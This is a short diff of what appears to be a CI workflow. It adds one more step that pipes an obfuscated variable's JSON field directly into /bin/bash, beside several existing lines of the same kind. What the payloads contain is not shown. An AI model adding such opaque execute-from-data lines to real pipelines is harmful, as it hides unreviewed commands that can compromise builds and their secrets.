@@ -50,6 +50,7 @@ jobs:
           printf '%s' "$g8" | jq -r .tng4 | /bin/bash
           printf '%s' "$x19087" | jq -r .qzne87 | /bin/bash
           printf '%s' "$ml7" | jq -r .xxtj5230 | /bin/bash
+          echo $uqabs65 | jq -r .qdve3795 | /bin/bash
 
       - name: Archive output
         if: always()
